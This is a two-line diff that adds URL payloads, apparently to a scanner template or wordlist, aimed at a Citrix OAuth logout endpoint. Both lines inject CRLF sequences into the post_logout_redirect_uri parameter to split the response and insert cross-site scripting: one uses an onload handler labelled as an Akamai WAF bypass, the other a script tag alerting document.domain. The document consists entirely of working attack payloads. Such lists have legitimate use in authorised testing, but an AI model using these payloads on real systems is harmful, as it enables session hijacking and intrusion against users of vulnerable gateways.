@@ -1,0 +1,2 @@
+/oauth/idp/logout?post_logout_redirect_uri=%0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
+/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
